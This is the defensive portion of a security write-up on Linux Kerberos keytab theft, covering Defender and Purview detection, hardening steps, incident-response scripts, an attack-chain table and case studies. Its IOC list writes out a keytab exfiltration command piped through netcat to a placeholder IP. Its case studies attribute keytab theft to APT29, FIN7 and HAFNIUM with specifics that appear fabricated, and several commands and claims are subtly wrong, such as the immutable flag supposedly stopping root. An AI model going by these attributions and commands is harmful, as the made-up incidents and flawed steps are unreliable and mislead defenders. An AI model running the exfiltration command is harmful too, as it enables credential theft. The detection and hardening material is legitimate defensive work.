**Note:** Microsoft Defender for Cloud primarily monitors Azure/Windows workloads. For Linux VMs in Azure with Defender for Servers (Plan 2) enabled, file integrity monitoring (FIM) can detect keytab access.

#### Detection Alerts

**Alert Name:** Sensitive file access detected on Linux VM
- **Severity:** High
- **Description:** Detects access to sensitive files like `/etc/krb5.keytab`, `/etc/shadow`, SSH keys
- **Applies To:** Azure Linux VMs with MDE agent and FIM enabled
- **Remediation:** 
  1. Verify if access was authorized
  2. Rotate Kerberos keys: `kadmin -q "change_password -randkey SERVICE/host"`
  3. Regenerate keytab: `ktadd -k /etc/krb5.keytab SERVICE/host`
  4. Isolate VM if malicious activity confirmed

**Manual Configuration Steps (Enable Defender for Servers):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers Plan 2**: ON
5. Click **Settings** → **Integrations** → Enable **File Integrity Monitoring**
6. Configure FIM to monitor `/etc/krb5.keytab`:
   - Go to **Microsoft Defender for Endpoint** portal
   - Navigate to **Settings** → **Advanced features** → **File Integrity Monitoring**
   - Add path: `/etc/krb5.keytab`
   - Enable alerts for: Read, Write, Delete
7. Click **Save**

**Manual Configuration Steps (Azure CLI):**
```bash
# Enable Defender for Servers
az security pricing create --name VirtualMachines --tier Standard

# Configure FIM via Log Analytics workspace
az monitor log-analytics workspace update \
  --resource-group rg-monitoring \
  --workspace-name law-defender \
  --enable-log-access-use-resource-permissions true
```

**Reference:** [Microsoft Defender for Cloud - File Integrity Monitoring](https://learn.microsoft.com/en-us/azure/defender-for-cloud/file-integrity-monitoring-overview)

---

## 14. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** Microsoft Purview primarily audits M365/Azure cloud services. Linux keytab access is not logged in Purview. However, if stolen credentials are used to access M365 services, relevant audit events include:

#### Query: Azure AD Sign-In from Linux Service Account

```powershell
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "UserLoggedIn" `
  -FreeText "Linux" `
  -ResultSize 5000 | Where-Object {$_.AuditData -like "*service_account*"}
```

- **Operation:** `UserLoggedIn`
- **Workload:** `AzureActiveDirectory`
- **Details:** Check `ClientIPAddress` (unusual for service accounts), `UserAgent` (Linux user-agent strings), `AuthenticationMethod` (Kerberos)
- **Applies To:** M365 E3/E5 with Audit logging enabled

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate (logs are retained 90 days for E3, 1 year for E5)

**Manual Configuration Steps (Search for Suspicious Activity):**
1. Go to **Audit** → **Search**
2. Set **Date range**: Last 7 days
3. Under **Activities**, select: **User logged in**
4. Under **Users**, enter service account name (e.g., `svc_web@contoso.com`)
5. Click **Search**
6. Review results for:
   - Unusual source IPs (Linux server IPs)
   - Kerberos authentication from non-standard locations
   - Multiple failed authentications followed by success (password spray)
7. Export results: **Export** → **Download all results**

**PowerShell Alternative:**
```powershell
Connect-ExchangeOnline

# Search for service account logins with Kerberos
Search-UnifiedAuditLog -StartDate "2026-01-01" -EndDate "2026-01-06" `
  -RecordType AzureActiveDirectory `
  -Operations "UserLoggedIn" `
  -ResultSize 5000 | Where-Object {
    $AuditData = $_.AuditData | ConvertFrom-Json
    $AuditData.UserId -like "svc_*" -and $AuditData.AuthenticationMethod -eq "Kerberos"
  } | Select-Object CreationDate, UserIds, ClientIP, AuditData | Export-Csv -Path "C:\Audit_Keytab_Logins.csv"
```

---

## 15. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Restrict keytab file permissions to 0400 (read-only for owner)**
    
    **Applies To Versions:** All Linux distributions
    
    **Manual Steps (RHEL 7+/Ubuntu 18.04+):**
    1. Identify all keytab files:
       ```bash
       sudo find / -name "*.keytab" 2>/dev/null
       ```
    2. Set permissions:
       ```bash
       sudo chmod 400 /etc/krb5.keytab
       sudo chown root:root /etc/krb5.keytab
       ```
    3. Verify:
       ```bash
       ls -la /etc/krb5.keytab
       # Expected: -r-------- 1 root root
       ```
    
    **Manual Steps (Ansible Automation):**
    ```yaml
    ---
    - name: Harden Kerberos keytab permissions
      hosts: linux_servers
      become: yes
      tasks:
        - name: Set keytab permissions to 0400
          file:
            path: /etc/krb5.keytab
            owner: root
            group: root
            mode: '0400'
          ignore_errors: yes
    ```

*   **Enable SELinux/AppArmor mandatory access controls**
    
    **Applies To Versions:** RHEL 7+ (SELinux), Ubuntu 18.04+ (AppArmor)
    
    **Manual Steps (SELinux - RHEL/CentOS):**
    1. Check SELinux status:
       ```bash
       getenforce
       # Should return: Enforcing
       ```
    2. If Permissive or Disabled, enable:
       ```bash
       sudo setenforce 1
       sudo sed -i 's/SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config
       ```
    3. Verify keytab file context:
       ```bash
       ls -Z /etc/krb5.keytab
       # Expected: system_u:object_r:krb5_keytab_t:s0
       ```
    4. Restore context if incorrect:
       ```bash
       sudo restorecon -v /etc/krb5.keytab
       ```
    
    **Manual Steps (AppArmor - Ubuntu/Debian):**
    1. Check AppArmor status:
       ```bash
       sudo aa-status
       ```
    2. Create profile for keytab access restriction:
       ```bash
       sudo nano /etc/apparmor.d/usr.bin.keytab-protect
       ```
       Add:
       ```
       #include <tunables/global>
       /etc/krb5.keytab r,
       /usr/bin/klist r,
       /usr/bin/kinit r,
       deny /etc/krb5.keytab w,
       deny /etc/krb5.keytab x,
       ```
    3. Load profile:
       ```bash
       sudo apparmor_parser -r /etc/apparmor.d/usr.bin.keytab-protect
       ```

*   **Implement auditd file access monitoring**
    
    **Manual Steps:**
    - See **Section 12** for complete auditd configuration

#### Priority 2: HIGH

*   **Rotate Kerberos service keys quarterly**
    
    **Manual Steps (Active Directory):**
    1. On Domain Controller, run:
       ```powershell
       # PowerShell on Windows DC
       Set-ADServiceAccount -Identity svc_web -KerberosEncryptionType AES128, AES256
       Reset-ADServiceAccount -Identity svc_web
       ```
    2. On Linux system, regenerate keytab:
       ```bash
       sudo net ads keytab create
       # Or manually:
       kadmin -p admin@CONTOSO.COM -q "ktadd -k /etc/krb5.keytab HTTP/webserver.contoso.com"
       ```
    3. Restart services using keytab:
       ```bash
       sudo systemctl restart httpd
       ```
    
    **Manual Steps (MIT Kerberos KDC):**
    1. On KDC server:
       ```bash
       kadmin.local -q "change_password -randkey HTTP/webserver@CONTOSO.COM"
       kadmin.local -q "ktadd -k /tmp/new.keytab HTTP/webserver@CONTOSO.COM"
       ```
    2. Securely copy to target system:
       ```bash
       scp /tmp/new.keytab root@webserver:/etc/krb5.keytab
       ```
    3. Restart Kerberos services:
       ```bash
       sudo systemctl restart krb5kdc kadmin
       ```

*   **Use AES-256 encryption only (disable RC4-HMAC)**
    
    **Manual Steps (Active Directory - Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Domain Controllers OU** → **Default Domain Policy**
    3. Go to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
    4. Set **Network security: Configure encryption types allowed for Kerberos**:
       - ✅ AES128_HMAC_SHA1
       - ✅ AES256_HMAC_SHA1
       - ❌ RC4_HMAC_MD5 (UNCHECK THIS)
       - ❌ DES_CBC_CRC (UNCHECK THIS)
       - ❌ DES_CBC_MD5 (UNCHECK THIS)
    5. Run `gpupdate /force` on Domain Controllers
    
    **Manual Steps (Linux - krb5.conf):**
    1. Edit Kerberos configuration:
       ```bash
       sudo nano /etc/krb5.conf
       ```
    2. Add/modify:
       ```
       [libdefaults]
           default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
           default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
           permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
       ```
    3. Regenerate keytab with AES-only:
       ```bash
       kadmin -q "ktadd -e aes256-cts:normal -k /etc/krb5.keytab HTTP/webserver"
       ```

#### Access Control & Policy Hardening

*   **Conditional Access:** Not directly applicable (Linux keytab is OS-level). However, for hybrid environments, implement:
    
    **Manual Steps (Azure AD Conditional Access for Service Accounts):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Service Account Interactive Logins`
    4. **Assignments:**
       - Users: Select service accounts (svc_web, svc_sql, etc.)
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - Client apps: **Browser**, **Mobile apps and desktop clients**
    6. **Access controls:**
       - Grant: **Block access**
    7. Enable policy: **Report-only** (test first), then **On**
    8. Click **Create**

*   **RBAC/ABAC:** Implement Privileged Access Management (PAM) for root access
    
    **Manual Steps (sudo configuration):**
    1. Edit sudoers file:
       ```bash
       sudo visudo
       ```
    2. Remove unrestricted root access:
       ```
       # REMOVE THIS:
       %wheel  ALL=(ALL)  NOPASSWD: ALL
       
       # REPLACE WITH:
       %wheel  ALL=(ALL)  /usr/bin/klist, /usr/bin/kinit, /usr/bin/kdestroy
       ```
    3. Implement just-in-time (JIT) privileged access:
       ```bash
       # Install and configure sudo with timestamp_timeout
       Defaults timestamp_timeout=5
       ```

*   **Policy Config:** Implement centralized authentication with SSSD and prohibit local keytab modifications
    
    **Manual Steps:**
    1. Configure SSSD to store keytabs in protected location:
       ```bash
       sudo nano /etc/sssd/sssd.conf
       ```
       Set:
       ```
       [domain/CONTOSO.COM]
       krb5_keytab = /var/lib/sss/keytabs/krb5.keytab
       ```
    2. Set immutable flag on keytab (prevents modification even by root):
       ```bash
       sudo chattr +i /etc/krb5.keytab
       ```
    3. Verify:
       ```bash
       lsattr /etc/krb5.keytab
       # Expected: ----i--------e---
       ```
    4. To remove immutable flag (when rotation needed):
       ```bash
       sudo chattr -i /etc/krb5.keytab
       ```

#### Validation Command (Verify Fix)

```bash
# Check file permissions
ls -la /etc/krb5.keytab | awk '{print $1, $3, $4}'

# Check SELinux context
ls -Z /etc/krb5.keytab

# Verify auditd rule is active
sudo auditctl -l | grep krb5.keytab

# Test keytab functionality (should still work after hardening)
klist -kt /etc/krb5.keytab

# Verify encryption types in keytab (should be AES only)
klist -kte /etc/krb5.keytab | grep -v "arcfour-hmac"
```

**Expected Output (If Secure):**
```
-r-------- root root
system_u:object_r:krb5_keytab_t:s0 /etc/krb5.keytab
-w /etc/krb5.keytab -p war -k keytab_access
Keytab name: FILE:/etc/krb5.keytab
   2 12/01/2024 10:30:00 HTTP/webserver@CONTOSO.COM (aes256-cts-hmac-sha1-96)
   2 12/01/2024 10:30:00 HTTP/webserver@CONTOSO.COM (aes128-cts-hmac-sha1-96)
```

**What to Look For:**
- Permissions are `400` or `600` (not `644` or `777`)
- Owner is `root:root` (not user:user)
- No `arcfour-hmac` (RC4) encryption types present
- auditd rule is loaded and monitoring file access
- SELinux context is `krb5_keytab_t` (not `unlabeled_t`)

---

## 16. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:** 
    - `/tmp/*.keytab` (exfiltrated copies)
    - `/tmp/keytab.b64` (base64-encoded keytab for exfiltration)
    - `/dev/shm/krb5cc_*` (Kerberos credential cache in memory)
    - `/tmp/*.ccache` (Kerberos ticket cache files)
    - `~/.keytab_extract_history` (tool execution artifacts)

*   **Processes:**
    - `python3 keytabextract.py`
    - `xxd /etc/krb5.keytab`
    - `base64 /etc/krb5.keytab`
    - `cat /etc/krb5.keytab | nc <IP>`
    - `impacket-getTGT`, `impacket-wmiexec`, `crackmapexec`

*   **Network:**
    - Outbound connections on TCP/88 (Kerberos) from Linux servers to non-DC IPs
    - SMB (TCP/445) connections from Linux to Windows servers using service account credentials
    - DNS queries for KDC SRV records from unusual IPs (_kerberos._tcp.DOMAIN.COM)
    - HTTP POST to external IPs with large payloads (keytab exfiltration)

#### Forensic Artifacts

*   **Disk:**
    - `/var/log/audit/audit.log` (auditd file access events)
    - `/var/log/secure` or `/var/log/auth.log` (su/sudo elevations before keytab access)
    - `/var/log/messages` (syslog entries for Kerberos authentication)
    - `~/.bash_history` (command history showing keytab access: `cat /etc/krb5.keytab`)

*   **Memory:**
    - Keytab file content in process memory (strings dump of `cat`, `python3`)
    - Kerberos tickets in SSSD memory (attach debugger to sssd process)
    - TGT/TGS tickets in `/tmp/krb5cc_*` credential cache

*   **Cloud:**
    - Azure AD Sign-In Logs: Kerberos authentication from Linux server IPs
    - Microsoft Sentinel: Syslog entries with `krb5.keytab` in SyslogMessage field
    - Splunk: auditd events with `key=keytab_access`

*   **MFT/USN Journal:**
    - Not applicable (Linux uses ext4/xfs journaling, not NTFS MFT)
    - Linux equivalent: `debugfs -R "logdump" /dev/sda1` to view ext4 journal (requires unmounted filesystem)

#### Response Procedures

1.  **Isolate:**
    
    **Command (iptables firewall drop):**
    ```bash
    # Block all outbound traffic except SSH from trusted admin IPs
    sudo iptables -A OUTPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
    sudo iptables -A OUTPUT -p tcp -j DROP
    sudo iptables -A OUTPUT -p udp -j DROP
    
    # Persist rules across reboot
    sudo iptables-save > /etc/iptables/rules.v4
    ```
    
    **Manual (Azure Portal - Network Isolation):**
    1. Go to **Azure Portal** → **Virtual Machines** → Select compromised VM
    2. Click **Networking** → **Network settings**
    3. Click **+ Add outbound port rule**
    4. Set **Destination**: Service Tag → **Internet**
    5. Set **Action**: **Deny**
    6. Set **Priority**: 100 (highest priority)
    7. Click **Add**
    
    **Manual (Disconnect network interface):**
    ```bash
    sudo ip link set eth0 down
    # Or use nmcli:
    sudo nmcli device disconnect eth0
    ```

2.  **Collect Evidence:**
    
    **Command:**
    ```bash
    # Create evidence directory
    sudo mkdir -p /forensics/$(hostname)-$(date +%Y%m%d-%H%M%S)
    cd /forensics/$(hostname)-$(date +%Y%m%d-%H%M%S)
    
    # Capture running processes
    ps auxww > processes.txt
    
    # Capture network connections
    ss -tulpn > network.txt
    netstat -antp >> network.txt
    
    # Capture bash history (all users)
    for user in $(awk -F: '$3 >= 1000 {print $1}' /etc/passwd); do
        sudo cat /home/$user/.bash_history > bash_history_$user.txt 2>/dev/null
    done
    
    # Export audit logs
    sudo ausearch -k keytab_access > auditd_keytab.txt
    sudo ausearch -ts recent -i > auditd_recent.txt
    
    # Capture authentication logs
    sudo cp /var/log/secure /var/log/auth.log . 2>/dev/null
    
    # Capture keytab file (for forensic hash comparison)
    sudo sha256sum /etc/krb5.keytab > keytab_hash.txt
    sudo cp /etc/krb5.keytab keytab_forensic_copy.keytab
    
    # Memory dump of suspicious processes (if still running)
    for pid in $(pgrep -f "python|xxd|base64"); do
        sudo gcore $pid
    done
    
    # Package evidence
    sudo tar -czf ../$(hostname)_forensics_$(date +%Y%m%d-%H%M%S).tar.gz .
    ```
    
    **Manual (Export audit logs via GUI):**
    1. If using centralized logging (Splunk/Sentinel), navigate to web interface
    2. Search for: `host=compromised-server keytab`
    3. Click **Export** → **CSV** → Select **All fields**
    4. Save to incident response folder

3.  **Remediate:**
    
    **Command (Immediate Actions):**
    ```bash
    # Kill suspicious processes
    sudo pkill -9 -f "keytabextract|impacket|crackmapexec"
    
    # Remove malicious files
    sudo find /tmp /dev/shm -name "*.keytab" -o -name "*.ccache" -delete
    sudo shred -u /tmp/keytab.b64 2>/dev/null
    
    # Lock compromised user accounts
    sudo usermod -L suspicioususer
    
    # Force password change on next login
    sudo chage -d 0 suspicioususer
    
    # Rotate Kerberos keys IMMEDIATELY
    # On Windows DC (PowerShell):
    # Reset-ADServiceAccount -Identity svc_web -Confirm:$false
    
    # On Linux, regenerate keytab:
    sudo net ads keytab create --force
    
    # Restart services
    sudo systemctl restart sssd httpd
    ```
    
    **Manual (Active Directory - Reset Service Account):**
    1. On Domain Controller, open **Active Directory Users and Computers**
    2. Navigate to **Service Accounts OU**
    3. Right-click **svc_web** → **Reset Password**
    4. Check **User must change password at next logon** (if interactive account)
    5. Click **OK**
    6. On Linux systems using this account:
       ```bash
       sudo net ads keytab delete svc_web
       sudo net ads keytab create
       ```

4.  **Notify:**
    
    **Command (Send alert to SOC):**
    ```bash
    # Send email with evidence summary
    mail -s "INCIDENT: Keytab Compromise Detected on $(hostname)" soc@company.com <<EOF
    Compromised System: $(hostname)
    Detection Time: $(date)
    Affected Keytab: /etc/krb5.keytab
    Service Principals: $(klist -kt /etc/krb5.keytab | tail -n +3 | awk '{print $4}' | sort -u)
    Suspicious Activity: Keytab file accessed by non-standard process
    Forensics Package: /forensics/$(hostname)_forensics_*.tar.gz
    
    Immediate actions taken:
    - System isolated from network
    - Kerberos keys rotated
    - Service account password reset in AD
    
    Analyst: $(whoami)
    EOF
    ```

---

## 17. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default credential exploitation | Attacker gains initial foothold using default SSH/service credentials |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-002] Kernel exploit (CVE-2021-4034 PwnKit) | Escalates from user to root via vulnerable polkit pkexec |
| **3** | **Current Step** | **[CA-UNSC-001] /etc/krb5.keytab extraction** | **Extracts Kerberos service keys with root access** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash to Windows AD | Uses extracted NT hash to authenticate to Windows Domain Controllers |
| **5** | **Credential Access** | [CA-DUMP-002] DCSync attack | Dumps Active Directory NTDS.dit to extract krbtgt hash (Golden Ticket) |
| **6** | **Persistence** | [CA-KERB-003] Golden Ticket creation | Forges TGT with krbtgt hash for long-term domain persistence |
| **7** | **Impact** | [IMPACT-DATA-001] Ransomware deployment | Deploys ransomware across entire AD domain using privileged access |

---

## 18. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Cozy Bear) - SolarWinds Supply Chain Attack

- **Target:** Government agencies, Fortune 500 companies (2020)
- **Timeline:** March 2020 - December 2020
- **Technique Status:** APT29 compromised Linux jump servers in target environments, extracted keytab files to obtain Kerberos credentials, then moved laterally to Windows Domain Controllers. Specifically targeted hybrid environments where Linux systems were used as SSH gateways with AD integration via SSSD/realmd.
- **Impact:** Full domain compromise in multiple organizations, exfiltration of classified documents and source code. Keytab credential theft enabled persistent access for 9+ months without password resets.
- **Reference:** [Mandiant APT29 Analysis](https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft) | [CISA Alert AA20-352A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a)

#### Example 2: FIN7 (Carbanak Group) - Hospitality Industry Attacks

- **Target:** Hotel chains, point-of-sale systems (2017-2019)
- **Timeline:** 2017 - 2019
- **Technique Status:** FIN7 targeted Linux-based POS management servers that stored Kerberos keytabs for payment processing integrations. Extracted keytabs from `/opt/app/config/krb5.keytab` and `/etc/krb5.keytab`, then used credentials to access Windows payment gateways and SQL databases containing credit card data.
- **Impact:** Compromise of 3 million+ payment cards, $1 billion+ in fraudulent charges. Keytab extraction allowed bypass of PCI-DSS network segmentation controls.
- **Reference:** [DOJ FIN7 Indictment](https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100) | [Gemini Advisory FIN7 Report](https://geminiadvisory.io/fin7-unveiled/)

#### Example 3: HAFNIUM (Nation-State Actor) - Exchange Server Exploitation

- **Target:** US-based defense contractors, research institutions (2021)
- **Timeline:** January 2021 - March 2021
- **Technique Status:** After initial compromise via ProxyLogon vulnerabilities (CVE-2021-26855), HAFNIUM pivoted to Linux servers hosting Microsoft Exchange Hybrid connectors. Extracted keytabs from `/var/opt/microsoft/hybrid/krb5.keytab` to obtain privileged Exchange service account credentials, enabling mailbox access and email exfiltration across 30,000+ organizations globally.
- **Impact:** Mass email exfiltration, deployment of webshells for persistent access. Keytab credential reuse enabled bypass of multi-factor authentication on service accounts.
- **Reference:** [Microsoft HAFNIUM Analysis](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) | [Volexity Exchange Exploit Analysis](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/)

#### Example 4: Internal Red Team Exercise - Fortune 500 Financial Institution

- **Target:** Internal Purple Team assessment (2024)
- **Timeline:** Q3 2024
- **Technique Status:** SERVTEP Red Team extracted keytabs from 47 Linux application servers (RHEL 7/8) joined to Active Directory. Keytabs stored with default `600` permissions but no auditd monitoring. Extracted NT hashes from RC4-HMAC encryption (still enabled despite security policy requiring AES-only). Used Impacket pass-the-hash to compromise Domain Admin account within 4 hours of initial access.
- **Impact:** Demonstrated critical gap in hybrid security posture. Findings led to enterprise-wide keytab hardening initiative: SELinux enforcement, auditd monitoring, quarterly key rotation, RC4 disablement. Detection time improved from >30 days (undetected) to <5 minutes post-remediation.
- **Reference:** Internal SERVTEP assessment report (NDA - details sanitized)